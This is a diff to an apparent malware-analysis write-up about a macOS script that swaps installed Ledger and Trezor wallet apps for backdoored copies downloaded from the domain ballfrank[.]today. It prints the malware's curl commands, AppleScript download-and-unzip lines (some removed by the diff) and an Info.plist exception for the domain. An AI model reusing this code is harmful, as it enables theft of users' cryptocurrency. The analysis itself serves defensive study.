@@ -740,17 +740,12 @@ curl -k -X POST \
      "http://$domain/gate"
 ```
 
-The script then checks for the presence of an application - '/Applications/Ledger Wallet.app'
-If this application exists on the host, elements of it are replaced:
+The script then has the functionality to check for two installed applications and replace them with backdoored compotents if they exist. Ledger & Trezor . We'll first take a look at Trezor. 
+The script checks for the presence of '/Applications/Ledger Wallet.app'
+
+If this application exists on the host, it is replaced with a backdoored version downloaded from the malicious domain:
 
 ```
-if ledger_installed then
-	try
-		do shell script "curl -k --user-agent 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36' -H 'api-key: 5190ef1733183a0dc63fb623357f56d6' -L " & quoted form of LEDGERURL & " -o " & quoted form of LEDGERDMGPATH
-		do shell script "unzip -q -o " & quoted form of LEDGERDMGPATH & " -d " & quoted form of LEDGERMOUNT
-
-
-
 set TREZORURL to "hxxps[://]ballfrank[.]today/trezor/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514"
 set TREZORDMGPATH to "/tmp/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514.zip"
 set TREZORMOUNT to "/tmp"
@@ -759,8 +754,6 @@ set TREZORPATH to TREZORMOUNT & "/" & TREZORNAME
 set TREZORAPPFOLDER to "/Applications"
 set TREZORDEST to TREZORAPPFOLDER & "/" & TREZORNAME
 ```
-
-App.asar and Info.plist are replaced.
 
 The most interesting element of the replaced Info,plist file are that the malicious domain is explicitly allowed under an ATS exception:
 
@@ -771,3 +764,5 @@ The most interesting element of the replaced Info,plist file are that the malici
   <dict>
     <key>ballfrank[.]today</key>
 ```
+
+
